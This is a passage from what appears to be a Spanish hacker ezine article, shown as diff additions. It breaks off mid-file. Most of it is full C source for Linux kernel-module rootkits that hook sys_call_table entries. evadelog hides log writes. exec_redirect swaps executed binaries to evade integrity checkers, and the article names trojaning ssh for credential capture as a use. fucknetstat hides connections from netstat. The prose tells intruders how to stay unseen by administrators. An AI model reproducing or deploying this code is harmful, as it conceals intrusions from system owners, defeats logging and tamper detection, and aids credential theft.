+  char *my_buf;
+  /*
+   * Creamos una copia del buffer.
+   */
+  my_buf=(char *)kmalloc(count+1, GFP_KERNEL);
+  my_bzero(my_buf, count+1);
+  memcpy(my_buf, buf, count);
+  /*
+   * Comprobamos si se debe ocultar o no.
+   */
+  if (ret=hide_str((char *)my_buf)) {
+    /*
+     * Se debe ocultar! Pues no imprimimos nada :)
+     */
+    kfree(my_buf);
+    return(count);
+  }
+  /*
+   * No se debe ocultar! Pues ale... llamamos a la syscall original.
+   */
+  kfree(my_buf);
+  return((*o_write)(fd, buf, count));
+}
+
+/*
+ * Aqui el rollo de siempre.
+ */
+int init_module() {
+  status.ins=(char *)kmalloc(strlen(DEF_INS), GFP_KERNEL);
+  status.del=(char *)kmalloc(strlen(DEF_DEL), GFP_KERNEL);
+  strcpy(status.ins, DEF_INS);
+  strcpy(status.del, DEF_DEL);
+  if (ins) {
+    kfree(status.ins);
+    status.ins=ins;
+  }
+  if (del) {
+    kfree(status.del);
+    status.del=del;
+  }
+  o_rename=sys_call_table[__NR_rename];
+  o_write=sys_call_table[__NR_write];
+  sys_call_table[__NR_rename]=my_rename;
+  sys_call_table[__NR_write]=my_write;
+#ifdef DEBUGMODE
+  printk("(EL) EvadeLog by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(EL) Loaded!\n");
+#endif
+  return(0);
+}
+
+void cleanup_module() {
+  sys_call_table[__NR_rename]=o_rename;
+  sys_call_table[__NR_write]=o_write;
+#ifdef DEBUGMODE
+  printk("(EL) EvadeLog by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(EL) UnLoaded!\n");
+#endif
+}
+
+MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
+MODULE_DESCRIPTION("hack: Evading log");
+MODULE_PARM(ins, "s");
+MODULE_PARM(del, "s");
+
+---/ evadelog.c /---
+
+     Veamos como funciona esto...
+     
+     
+    barracuda~# insmod evadelog.o ins=mete del=saca
+    barracuda~# touch "nosaldre jeje" ; mv "nosaldre jeje" mete ; rm "nosaldre jeje"
+    barracuda~# echo "nosaldre jeje"
+    barracuda~#
+    
+
+     Bueno, seguro que habeis visto el problema que presenta este evadelog.c
+¿no? Sencillo. Para nosotros cargar el modulo e insertar, por ejemplo, nuestra
+IP en la lista debemos entrar en la maquina, por lo que ya estamos dejando
+algo en el messages (ya sea un log del telnetd, sshd, o lo que sea). Seria
+ideal poder añadir elementos a la lista desde fuera de la maquina ¿no? Pues
+si pensais un poco y os leeis el punto anterior encontrareis como hacerlo.
+Como siempre digo DoItYourSelf!! Os dejo ese travajito a vosotros, pues si
+habeis llegado hasta aqui fijo que podreis.
+
+
+
+   
+    5.6. Redireccionando ejecuciones
+    --------------------------------
+    
+     Son muchas las ocasiones en las que nos es necesario troyanizar algun
+ejecutable en una maquina (Un ejemplo muy claro es el del cliente ssh, el
+cual suele troyanizarse para poder capturar los login/password que con un
+sniffer serian imposibles de sacr), pero obiamente ello requiere la
+modificacion del fichero ejecutable, lo que puede conllevar consecuencias
+fatales, si por ejemplo el administrador usa tripwire o cualquier otra
+herramienta de ese tipo. La solucion pasa por hacer que al solicitar la
+ejecucion de un binario determinado se ejecute otro. ¿Como podemos hacer
+esto? Pues es facil. Basta con saber que la syscall que usa el kernel para
+cargar todos los datos en memoria para ejecutar un binario determinado es
+execve, asi que sera esa syscall la que debemos interceptar. Al ir haciendo
+el modulo nos encontramos con algunos problemas. El primero de ellos es que
+una vez hoockeada la syscall execve no podemos llamar a la original usando
+como referencia el puntero, el motivo es algo complejo, quedaros con que
+tras la ejecucion de la interrupcion 80h se colocan unas cosas en el stack
+que execve leera despues, pero si saltamos al punero deirectamente dichas
+cosas no seran colocadas en el stack y se arma el catacrash. La solucion a
+ese problema es sencilla, basta con usar la int 80h para llamar a la syscall
+original, para ello debemos copiar el valor del puntero
+sys_call_table[__NR_execve] en otra posicion de la sys_call_table para luego
+poder llamarlo. En nuestro modulo usarmos una funcion llamada mexecve() para
+llamar a la syscall original.
+
+
+int mexecve(const char *filename, char **argv, char **envp)
+{
+  long __res;
+  __asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_mexecve), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp)));
+  return (int) __res;
+}
+
+
+     Otro problema con el que nos encontramos es que debemos pasarle a mexecve
+un puntero que apunte a la user memory. La solucion tambien es sencilla. 
+Usaremos la syscall brk (una cosa similar a lo que hace malloc) para reservar
+la memoria. Miraos el modulo para mas detalles.
+
+---/ exec_redirect.c /---
+
+/*
+ * TILE: Exec Redirect v1.0 <24/7/2001>
+ *
+ * CODER: Ripe - <ripe@7a69ezine.org>
+ *
+ * DESCR: Sometimes we want to modify some binary file in a hacked host, but
+ *        it's too dangerous because MD5 checkers can   us. So we must to
+ *        searsh a metod to redirect executions using the kernel. We can
+ *        do it using sys_execve syscall very bad :)
+ *
+ *        In this LKM i've not created the metod to comunicate with kernel,
+ *        but im sure that you can code it... DoItYourSelf.
+ *
+ * RECOM: Learn how to coe LKMs.... You'll be better :)
+ *
+ * TESTED: This LKM have been tested without problems on:
+ *           - Linux kernel 2.2.18pre10 (Debian 2.2)
+ *           - Linux kernel 2.2.19 (Debian 2.2)
+ *
+ */
+
+#define __KERNEL__
+#define MODULE
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/proc_fs.h>
+#include <linux/dirent.h>
+
+#include <sys/syscall.h>
+
+#define _7A69SOFT_
+#define CODER       "Ripe"
+#define DEBUGMODE
+
+/*
+ * La entrada en la sys_call_table en la que copiaremos el puntero a la
+ * syscall execve original, para poder llamarla desde mexecve().
+ */
+#define __NR_mexecve  222
+
+extern void *sys_call_table[];
+
+typedef struct {
+  char *o_exec;
+  char *my_exec;
+  struct lexec *next;
+} lexec;
+
+lexec *e_list;
+
+int (*o_execve)(const char *filename, char *const argv [], char *const envp[]);
+int (*o_brk)(void *end_data_segment);
+void *tmp;
+
+lexec *is_exec(char *o_exec, char *my_exec);
+
+void my_bzero(char *buf, int size) {
+  memset(buf, 0, size);
+}
+
+/*
+ * El rollo de siempre para mantener la lista enlazada.
+ */
+void add_exec(char *o_exec, char *my_exec) {
+  lexec *ptr=e_list;
+#ifdef DEBUGMODE
+  printk("(ER) Adding %s -> %s to redirect list\n", o_exec, my_exec);
+#endif
+  if ((lexec *)is_exec(o_exec,my_exec)) return;
+  if (ptr) {
+    while (ptr->next) {
+      if (!strcmp(ptr->o_exec, o_exec) && !strcmp(ptr->my_exec, my_exec)) return;
+      ptr=(lexec *)ptr->next;
+    }
+    ptr->next=(struct lexec *)kmalloc(sizeof(lexec), GFP_KERNEL);
+    ptr=(lexec *)ptr->next;
+    ptr->o_exec=(char *)kmalloc(strlen(o_exec)+1, GFP_KERNEL);
+    ptr->my_exec=(char *)kmalloc(strlen(my_exec)+1, GFP_KERNEL);
+    strcpy(ptr->o_exec, o_exec);
+    strcpy(ptr->my_exec, my_exec);
+    ptr->next=NULL;
+  } else {
+    e_list=(lexec *)kmalloc(sizeof(lexec), GFP_KERNEL);
+    ptr=e_list;
+    ptr->o_exec=(char *)kmalloc(strlen(o_exec)+1, GFP_KERNEL);
+    ptr->my_exec=(char *)kmalloc(strlen(my_exec)+1, GFP_KERNEL);
+    strcpy(ptr->o_exec, o_exec);
+    strcpy(ptr->my_exec, my_exec);
+    ptr->next=NULL;
+  }
+  return;
+}
+
+void del_exec(char *o_exec, char *my_exec) {
+  lexec *ptr=e_list, *ptr2;
+#ifdef DEBUGMODE
+  printk("(ER) Deleting %s -> %s from redirect list\n", o_exec, my_exec);
+#endif
+  if (!ptr) return;
+  if (!strcmp(ptr->o_exec, o_exec) && !strcmp(ptr->my_exec, my_exec)) {
+    e_list=(lexec *)ptr->next;
+    kfree(ptr->o_exec);
+    kfree(ptr->my_exec);
+    kfree(ptr);
+    return;
+  }
+  while(ptr) {
+    if (!strcmp(ptr->o_exec, o_exec) && !strcmp(ptr->my_exec, my_exec)) break;
+    ptr2=ptr;
+    ptr=(lexec *)ptr->next;
+  }
+  if (ptr) {
+    ptr2->next=ptr->next;
+    kfree(ptr->o_exec);
+    kfree(ptr->my_exec);
+    kfree(ptr);
+  }
+  return;
+}
+
+lexec *is_exec(char *o_exec, char *my_exec) {
+  lexec *ptr=e_list;
+  while(ptr) {
+    if (my_exec) {
+      if (!strcmp(ptr->o_exec, o_exec) && !strcmp(ptr->my_exec, my_exec)) return(ptr);
+    } else {
+      if (!strcmp(ptr->o_exec, o_exec)) return(ptr);
+    }
+    ptr=(lexec *)ptr->next;
+  }
+  return(NULL);
+}
+
+/*
+ * No podemos pasarle a strlen un puntero a la user memory, pues 
+ * interpretaria que el puntero es a la kernel memory. Para solucionarlo
+ * usaremos esta funcion.
+ */
+int umem_strlen(char *uptr) {
+  char ch=255;
+  char *ptr;
+  int len;
+  for (ptr=uptr, len=0 ; ch!=0 ; __generic_copy_from_user(&ch, ptr, 1), len++, ptr++);
+  return(len-1);
+}
+	  
+/*
+ * Esta es la funcion a la que llamaremos cuando queramos que se ejecute
+ * execve original.
+ */
+int mexecve(const char *filename, char **argv, char **envp)
+{
+  long __res;
+  __asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_mexecve), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp)));
+  return (int) __res;
+}
+
+/*
+ * Nuestra version troyanizada de la syscall... que malos somos :)
+ */
+int my_execve(const char *filename, char *const argv [], char *const envp []) {
+  char *exec;
+  int ret;
+  lexec *redir;
+  unsigned long tmp;
+  /*
+   * No podemos trabajar con los puntero de la user memory, asi que no
+   * hacemos una copia en la memoria del kernel :)
+   */
+  exec=(char *)kmalloc(umem_strlen((char *)filename)+1, GFP_KERNEL);
+  memset(exec, 0, umem_strlen((char *)filename)+1);
+  __generic_copy_from_user(exec, filename, umem_strlen((char *)filename));
+  /*
+   * Comprobamos si el fichero que se solicita a ejecutar contiene una entrada
+   * en la lista enlazada.
+   */
+  if (redir=is_exec(exec, NULL)) {
+    /*
+     * Si la tiene reservamos memoria en la user memory con la syscall
+     * brk. Esto es lo mismo que hace malloc :)
+     * Necesitamos reservar esa memoria, pues el puntero que deberemos
+     * pasar a la syscall mas adelante debera estar en la user memory.
+     */
+    kfree(exec);
+    tmp=current->mm->brk;
+    (*o_brk)((void *)current->mm->brk+umeme_strlen((char *)filename)+1);
+    /*
+     * Copiamos el nombre del fichero a ejecutar.... :)
+     */
+    __generic_copy_to_user(tmp, redir->my_exec);
+    /*
+     * Lo ejecutamos.
+     */
+    ret=mexecve((char *)tmp, (char **)argv, (char **)envp);
+    /*
+     * Volvemos a dejar libre la memoria que reservamos en la user memory.
+     */
+    (*o_brk)((void *)tmp);
+    return(ret);
+  }
+  kfree(exec);
+  /*
+   * Si no debemos redireccionar nada... pues quietoparao no toques nada!!
+   */
+  return(mexecve(filename, (char **)argv, (char **)envp));
+}
+
+/*
+ * El rollo se siempre.
+ */
+int init_module() {
+  o_brk=sys_call_table[__NR_brk];
+  o_execve=sys_call_table[__NR_execve];
+  tmp=sys_call_table[__NR_mexecve]; /* esto es para poder restaurar la syscall
+                                     * nula luego en cleanup_module.
+                                     */
+  sys_call_table[__NR_mexecve]=o_execve; /*
+                                          * con esto hacemos la copia de
+                                          * la syscall exeve en otra entrada
+                                          * de la sys_call_table.
+                                          */
+  sys_call_table[__NR_execve]=my_execve;
+  sys_call_table[__NR_mexecve]=o_execve;
+#ifdef DEBUGMODE
+  printk("(ER) Exec Redirect by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(ER) Loaded!\n");
+#endif
+  /*
+   * Aqui he colocado las redirecciones.
+   * Podria haber hookeado una syscall para comunicarme con el kernel
+   * y asi poder aqadir entradas en la lista enlazada una vez cargado
+   * el modulo, pero me dio palo hacerlo... ademas asi te dejo un poco
+   * de trabajo :)
+   */
+  add_exec("/bin/ls", "/bin/cat");
+  return(0);
+}
+
+void cleanup_module() {
+  /*
+   * Lo dejamos todo como estaba antes de tocar nada :P
+   */
+  sys_call_table[__NR_execve]=o_execve;
+  sys_call_table[__NR_mexecve]=tmp;
+#ifdef DEBUGMODE
+  printk("(ER) Exec Redirect by Ripe - <ripe@7a69ezine.org>\n");
+  printk("(ER) UnLoaded!\n");
+#endif
+}
+
+MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
+MODULE_DESCRIPTION("hack: exec redirect");
+
+---/ exec_redirect.c /---
+
+
+     Como podeis ver aqui uso add_exec() en init_module, ello es asi porque 
+no he implementado ningun metodo de comunicacion con el kernel para añadir
+y quitar elementos en la lista enlazada... ese es un trabajo que te dejo a 
+ti, que ya va siendo hora que te curres algo :)
+
+
+
+
+    5.7. Ocultando conexiones al sistema
+    ------------------------------------
+    
+     Es muy probable (a todos nos ha pasado) que el administrador de un
+sistema entre mientras estamos nosotros dentro, por lo que haciendo un
+simple "netstat" podria ver nuestra conexion al sistema (NOTA: Usando
+evadelog.c tambien podriamos ocultar las conexiones con nuestra IP), o la
+de algun bouncer que tengamos montado. Nosotros como buenos hackers debemos
+cubrirnos las espaldas en ese sentido. El tema esta en saber como trabaja
+netstat, asi que lo primero que vamos a hacer va a ser tracear lo que hace un
+"netstat -na", de manera que sabiendo como trabaja este sabremos por donde
+debemos atacar.
+
+
+    barracuda~# strace netstat -na > /dev/null
+    execve("/bin/netstat", ["netstat", "-na"], [/* 19 vars */]) = 0
+    uname({sys="Linux", node="server", ...}) = 0
+    brk(0)                                  = 0x805a718
+    old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40015000
+    (... etc etc ...)
+    write(1, "Active Internet connections (ser"..., 54) = 54
+    write(1, "Proto Recv-Q Send-Q Local Addres"..., 80) = 80
+    open("/proc/net/tcp", O_RDONLY)         = 3
+    fstat(3, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+    old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40017000
+    (... etc etc ...)
+    munmap(0x40016000, 4096)                = 0
+    _exit(0)                                = ?
+    barracuda~#
+
+
+     Como podemos ver lo que netstat hace es leer de /proc/net/tcp las 
+conexiones activas (tambien lee de /proc/net/tcp6, /proc/net/udp.... Si
+quereis mas informacion haced un strace en vuestra maquina y mirad todo lo
+que sale, pues yo solo he dejado aqui la parte mas importante). Ahora lo que
+deberiamos tratar de ver es como esta estructurado el fichero.
+
+
+    barracuda~# cat /proc/net/tcp
+      sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
+       0: 00000000:0019 00000000:0000 0A 00000000:00000000 00:00000000 00000000
+    0        0 93
+       1: 00000000:0200 00000000:0000 0A 00000000:00000000 00:00000000 00000000
+    0        0 92
+       2: 00000000:0201 00000000:0000 0A 00000000:00000000 00:00000000 00000000
+    0        0 91
+    (... etc etc ...)
+    barracuda~#
+
+    
+     Parece que esta toda la informacin aqui metida en hexadecimal, y que
+netstat lo unico que hace es leerla y representarla de forma bonita. Esta
+claro pues que debemos hacer que netstat lea lo que nosotros queramos ¿no?
+Pues toca atacar la syscall read :)
+
+     ¿Como lo haremos? Lo primero sera llamar a read original para extraer
+el buffer, luego linea a linea (separando por retornos de carro)
+comprobaremos si hay algo que nos puede comprometer o no (basandonos una vez
+mas en una lista enlazada). Si hay algo que nos compromete nos lo cargamos.
+Veamos, que un source es mejor que 1000 palabras, o eso dicen.
+
+---/ fucknetstat.c /---
+
+/*
+ * TILE: FuckNetstat
+ *
+ * CODER: Ripe
+ *
+ * DESCR: This LKM may be used to hide connection in a linux system. The
+ *        interface to comunicate with LKM is a device... see dev_command()
+ *        for usage info :)
+ *
+ * RECOM: Give me money.
+ *
+ */
+
+#define __KERNEL__
+#define MODULE
+
+/*
+ * K_22 para kernels 2.2 y K_24 para kernels 2.4 :)
+ */
+#define K_22
+//#define K_24
+
+#include <linux/ctype.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+
+#include <linux/mm.h>
+#include <linux/errno.h>
+
+#ifdef K_24
+#include <linux/in.h>
+#endif /* K_24 */
+
+#include <sys/syscall.h>
+
+extern void *sys_call_table[];
+
+int errno;
+
+typedef struct {
+  struct sockaddr_in *local;
+  struct sockaddr_in *remote;
+  struct laddr *next;
+} laddr;
+
+laddr *list_addr=NULL;
+
+int (*o_read)(int, char *, int);
+
+/*
+ * aqadir/quitar... te lo deberias saber de memoria.
+ */
+void add_addr(struct sockaddr_in *local, struct sockaddr_in *remote) {
+  laddr *ptr=list_addr;
+  if (!local && !remote) return;
+#ifdef LKM_MSGDEBUGMODE
+  if (local) printk("<1>%d.%d.%d.%d:%d", NIPQUAD(local->sin_addr.s_addr), local->sin_port);
+  else printk("<1>0.0.0.0:0");
+  if (remote) printk("<1> %d.%d.%d.%d:%d", NIPQUAD(remote->sin_addr.s_addr), remote->sin_port);
+  else printk("<1> 0.0.0.0:0");
+  printk("<1> added to hide connection list\n");
+#endif /* LKM_MSGDEBUGMODE */
+  if (is_addr(local, remote)) return;
+  if (ptr) {
+    while(ptr->next) ptr=(laddr *)ptr->next;
+    ptr->next=(struct laddr *)kmalloc(sizeof(laddr), GFP_KERNEL);
+    ptr=(laddr *)ptr->next;
+  } else {
+    list_addr=(laddr *)kmalloc(sizeof(laddr), GFP_KERNEL);
+    ptr=list_addr;
+  }
+  if (local) {
+    ptr->local=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
+    memcpy(ptr->local, local, sizeof(struct sockaddr_in));
+  } else ptr->local=NULL;
+  if (remote) {
+    ptr->remote=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
+    memcpy(ptr->remote, remote, sizeof(struct sockaddr_in));
+  }
+  ptr->next=NULL;
+  return;
+}
+
+void del_addr(struct sockaddr_in *local, struct sockaddr_in *remote) {
+  laddr *ptr=list_addr, *ptr2;
+  if ((!local && !remote) || !ptr) return;
+#ifdef LKM_MSGDEBUGMODE
+  if (local) printk("<1>%d.%d.%d.%d:%d", NIPQUAD(local->sin_addr.s_addr), local->sin_port);
+  else printk("<1>0.0.0.0:0");
+  if (remote) printk("<1> %d.%d.%d.%d:%d", NIPQUAD(remote->sin_addr.s_addr), remote->sin_port);
+  else printk("<1> 0.0.0.0:0");
+  printk("<1> removed from hide connection list\n");
+#endif /* LKM_MSGDEBUGMODE */
+  if (!memcmp(local, ptr->local, sizeof(struct sockaddr_in)) && !memcmp(remote,
+ptr->remote, sizeof(struct sockaddr_in))) {
+    list_addr=(laddr *)ptr->next;
+    if (ptr->local) kfree(ptr->local);
+    if (ptr->remote) kfree(ptr->remote);
+    kfree(ptr);
+    goto ret;
+  }
+  while(ptr) {
+    if (!memcmp(local, ptr->local, sizeof(struct sockaddr_in)) && !memcmp(remote, ptr->remote, sizeof(struct sockaddr_in))) break;
+    ptr2=ptr;
+    ptr=(laddr *)ptr->next;
+  }
+  if (ptr) {
+    ptr2->next=ptr->next;
+    if (ptr->local) kfree(ptr->local);
+    if (ptr->remote) kfree(ptr->remote);
+    kfree(ptr);
+  }
+ret:
+  return;
+}
+
+int is_addr(struct sockaddr_in *local, struct sockaddr_in *remote) {
+  laddr *ptr=list_addr;
+  int ret=0;
+  while(ptr) {
+    if (!memcmp(local, ptr->local, sizeof(struct sockaddr_in)) && !memcmp(remote, ptr->remote, sizeof(struct sockaddr_in))) {
+      ret=1;
+      goto ret;
+    }
+    ptr=(laddr *)ptr->next;
+  }
+ret:
+  return(ret);
+}
+
+int hide_connection(struct sockaddr_in *local, struct sockaddr_in *remote) {
+  laddr *ptr=list_addr;
+  int ret=0;
+  if (!ptr) goto ret;
+  while(ptr) {
+    if (hideme(local, remote, ptr)) {
+      ret=1;
+      goto ret;
+    }
+    ptr=(laddr *)ptr->next;
+  }
+ret:
+  return(ret);
+}
+
+int hideme(struct sockaddr_in *local, struct sockaddr_in *remote, laddr *ptr) {
+  int l=0;
+  int r=0;
+  if (ptr->local) {
+    if (!memcmp(local, ptr->local, sizeof(struct sockaddr_in))) l=1;
+    else goto ret;
+  } else l=1;
+  if (ptr->remote) {
+   if (!memcmp(remote, ptr->remote, sizeof(struct sockaddr_in))) r=1;
+   else goto ret;
+  } else r=1;
+ret:
+  if (l && r) return(1);
+  else return(0);
+}
+
+/*
+ * Estos son funciones varias....
+ * strtoargs() pasa un string a argv :P
+ * atoi() el de toda la vida
+ * inet_aton() inet_addr() pues conversiones de IP.
+ * strtosockaddr() crea un sockaddr pasandole un string.
+ */
+unsigned int strtoargs(char *buf, char ***argv) {
+  char *ptr;
+  char **margv;
+  int *nchs=NULL;
+  int len=strlen(buf)+1;
+  int i;
+  int w;
+  int argc=0;
+  for (i=0 ; i<len ; i++) if (buf[i]==' ' || buf[i]==0) argc++;
+  nchs=(int *)kmalloc(argc*sizeof(int), GFP_KERNEL);
+  margv=(char **)kmalloc(argc*sizeof(char *), GFP_KERNEL);
+  memset(nchs, 0, argc*sizeof(int));
+  memset(margv, 0, argc*sizeof(char *));
+    w=0;
+    for (i=0 ; i<len ; i++) {
+      if (buf[i]==' ' || buf[i]==0) {
+      w++;
+      continue;
+      }
+    nchs[w]++;
+    }
+  ptr=buf;
+  for (i=0 ; i<argc ; i++) {
+    margv[i]=(char *)kmalloc(nchs[i]+1, GFP_KERNEL);
+    memset(margv[i], 0, nchs[i]+1);
+    strncpy(margv[i], ptr, nchs[i]);
+    ptr += (nchs[i]+1);
+  }
+  margv[argc-1][nchs[argc-1]-1]=0;
+  *(argv)=margv;
+  return(argc);
+}
+
+int atoi(char *str) {
+  int res=0;
+  int mul=1;
+  char *ptr;
+  for (ptr=str+strlen(str)-1 ; ptr>=str ; ptr--) {
+    if (*ptr < '0' || *ptr > '9') return(-1);
+    res+=(*ptr-'0')*mul;
+    mul*=10;
+  }
+  return (res);
+}
+
+int inet_aton(const char *cp, struct in_addr *addr) {
+  register u_long val;
+  register int base, n;
+  u_int parts[4];
+  register u_int *pp = parts;
+  for (;;) {
+    if (*cp == '0') {
+      if (*++cp == 'x' || *cp == 'X') base = 16, cp++;
+      else base = 8;
+    } else base = 10;
+    val = simple_strtoul (cp, (char **) &cp, base);
+    if (val == ULONG_MAX) return 0;
+    if (*cp == '.') {
+      if (pp >= parts + 3 || val > 0xff) return (0);
+      *pp++ = val, cp++;
+    } else break;
+  }
+  if (*cp && (!isascii(*cp) || !isspace(*cp))) return (0);
+  n = pp - parts + 1;
+  switch (n) {
+  case 1:
+      break;
+  case 2:
+      if (val > 0xffffff) return (0);
+      val |= parts[0] << 24;
+      break;
+  case 3:
+      if (val > 0xffff) return (0);
+      val |= (parts[0] << 24) | (parts[1] << 16);
+      break;
+  case 4:
+      if (val > 0xff) return (0);
+      val |= (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8);
+      break;
+  }
+  if (addr) addr->s_addr = htonl(val);
+  return (1);
+}
+
+unsigned long inet_addr(const char *cp) {
+  struct in_addr val;
+  if (inet_aton(cp, &val))
+    return (val.s_addr);
+  return (0);
+}
+
+void strtosockaddr(char *ip_port, struct sockaddr_in *saddr) {
+  char *ip=ip_port;
+  char *port;
+  int len=strlen(ip_port);
+  int i;
+  for(i=0 ; i<len && *(ip_port+i)!=':' ; i++);
+  *(ip_port+i)=0;
+  port=ip_port+i+1;
+  memset(saddr, 0, sizeof(struct sockaddr_in));
+  saddr->sin_addr.s_addr=inet_addr(ip);
+  saddr->sin_port=atoi(port);
+}
+
+#define NO_HIDE 0
+#define TCP     1
+
+/*
+ * Hora de actuar.
+ */
+int my_read(int fd, char *buf, int count) {
+  char *kbuf;
+  char *kbuf2;
+  char *tmp;
+  char line[1024];
+  int hide=NO_HIDE;
+  int off=0;
+  int off2=0;
+  int o_ret;
+  int ret=0;
+  int lsize;
+  struct sockaddr_in local_addr;
+  struct sockaddr_in remote_addr;
+  o_ret=(*o_read)(fd, buf, count);
+  /*
+   * Estamos leyendo un file llamado "tcp"?
+   */
+  if (!strcmp(current->files->fd[fd]->f_dentry->d_iname, "tcp")) hide=TCP;
+  /*
+   * lo de count>10000 lo hago por que luego hacemos un kmalloc(), y no
+   * es plan de pasarse con la memoria a reservar :)
+   */
+  if (hide==NO_HIDE || count<1 || count>10000) {
+    ret=o_ret;
+    goto ret;
+  }
+  kbuf=(char *)kmalloc(count+1, GFP_KERNEL);
+  memset(kbuf, 0, count+1);
+  kbuf2=(char *)kmalloc(count+1, GFP_KERNEL);
+  memset(kbuf2, 0, count+1);
+  __generic_copy_from_user(kbuf, buf, o_ret);
+  /*
+   * Parseamos linea a linea el fichero.
+   */
+  while(off<o_ret) {
+    lsize=0;
+    memset(line, 0, sizeof(line));
+    while(lsize<sizeof(line) && off<o_ret) {
+      line[lsize++]=kbuf[off++];
+      if (kbuf[off-1]=='\n') break;
+    }
+    if (hide==TCP) {
+      /*
+       * La pimera linea del file "tcp" no contiene informacion, y empieza
+       * por "  sl" :PPP
+       */
+      if (strncmp(line, "  sl", 4)) {
+        memset(&local_addr, 0, sizeof(struct sockaddr_in));
+        memset(&remote_addr, 0, sizeof(struct sockaddr_in));
+        tmp=(char *)&line[6];
+        local_addr.sin_addr.s_addr=simple_strtoul(tmp, NULL, 16);
+        tmp=(char *)&line[20];
+        remote_addr.sin_addr.s_addr=simple_strtoul(tmp, NULL, 16);
+        tmp=(char *)&line[15];
+        local_addr.sin_port=(unsigned int)simple_strtoul(tmp, NULL, 16);
+        tmp=(char *)&line[29];
+        remote_addr.sin_port=(unsigned int)simple_strtoul(tmp, NULL, 16);
+        /*
+         * Si debemos ocultar, no lo copiamos :)
+         */
+        if (hide_connection(&local_addr, &remote_addr)) continue;
+      }
+    }
+    memcpy(kbuf2+off2, line, lsize);
+    off2+=lsize;
+    ret+=lsize;
+  }
+  __generic_copy_to_user(buf, kbuf2, o_ret);
+  kfree(kbuf);
+  kfree(kbuf2);
+ret:
+  return(ret);
+}
+
+
+#define makedev(major, minor) ((((uint) major & 0xFF) << 8) | ((uint) minor & 0xFF))
+
+int mn;
+
+int dev_busy=0;
+static spinlock_t dev_busy_lock=SPIN_LOCK_UNLOCKED;
+
+static inline _syscall3 (int, mknod, char *, path, mode_t, mode, dev_t, dev);
+static inline _syscall1 (int, unlink, char *, path);
+
+void dev_command(int, char **); /* FIXME: temporal (pereza rlz!) */
+
+ssize_t fog2_dev_write(struct file *f, const char *buf, size_t len, loff_t *offset) {
+  unsigned int argc;
+  char **argv;
+  char *mbuf=(char *)kmalloc(len+1, GFP_KERNEL);
+  memset(mbuf, 0, len+1);
+  memcpy(mbuf, buf, len);
+  argc=strtoargs(mbuf, &argv);
+  if (argc) dev_command(argc, argv);
+  kfree(mbuf);
+  return(len);
+}
+
+int fog2_dev_open(struct inode *i, struct file *f) {
+  int ret=0;
+  spin_lock(&dev_busy_lock);
+  if (dev_busy) {
+    ret=-1;
+    goto ret;
+  }
+#ifdef LKM_MSGDEBUGMODE
+  printk("<1>Device opened\n");
+#endif /* LKM_MSGDEBUGMODE */
+#ifndef LKM_DEBUGMODE
+  MOD_INC_USE_COUNT;
+#endif /* LKM_DEBUGMODE */
+  dev_busy++;
+  spin_unlock(&dev_busy_lock);
+ret:
+  return(0);
+}
+
+int fog2_dev_release(struct inode *i, struct file *f) {
+#ifdef LKM_MSGDEBUGMODE
+  printk("<1>Device closed\n");
+#endif /* LKM_MSGDEBUGMODE */
+#ifndef LKM_DEBUGMODE
+  MOD_DEC_USE_COUNT;
+#endif /* LKM_DEBUGMODE */
+  spin_lock(&dev_busy_lock);
+  dev_busy--;
+  spin_unlock(&dev_busy_lock);
+  return(0);
+}
+
+struct file_operations fops = {
+#ifdef K_24
+  NULL,                       /* owner */
+#endif /* K_24 */
+  NULL,                       /* llseek */
+  NULL,                       /* read */
+  (void *)fog2_dev_write,     /* write */
+  NULL,                       /* readdir */
+  NULL,                       /* poll */
+  NULL,                       /* ioctl */
+  NULL,                       /* mmap */
+  (void *)fog2_dev_open,      /* open */
+  NULL,                       /* flush */
+  (void *)fog2_dev_release,   /* release */
+  NULL,                       /* fsync */
+  NULL,                       /* fasync */
+#ifdef K_22
+  NULL,                       /* check_media_change */
+  NULL,                       /* revalidate */
+  NULL                        /* lock */
+#endif /* K_22 */
+#ifdef K_24
+  NULL,                       /* lock */
+  NULL,                       /* readv */
+  NULL                        /* writev */
+#endif /* K_24 */
+};
+
+/*
+ * Leer esta funcion para saber usarlo :)
+ */
+void dev_command(int argc, char **argv) {
+  int i;
+  int len=0;
+  char *log;
+  char *ptr;
+  struct sockaddr_in *local=NULL;
+  struct sockaddr_in *remote=NULL;
+  if (!strcmp(argv[0], "add")) {
+    if (argc<2) return;
+    if (!strcmp(argv[1], "addr")) {
+      if (argc<4) return;
+      if (strcmp(argv[2], "none")) {
+        local=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
+        strtosockaddr(argv[2], local);
+      }
+      if (strcmp(argv[3], "none")) {
+         remote=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
+         strtosockaddr(argv[3], remote);
+      }
+      add_addr(local, remote);
+      kfree(local);
+      kfree(remote);
+    }
+  }
+  if (!strcmp(argv[0], "del")) {
+    if (argc<2) return;
+    if (!strcmp(argv[1], "addr")) {
+      if (argc<4) return;
+      if (strcmp(argv[2], "none")) {
+        local=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
+        strtosockaddr(argv[2], local);
+      }
+      if (strcmp(argv[3], "none")) {
+         remote=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
+         strtosockaddr(argv[3], remote);
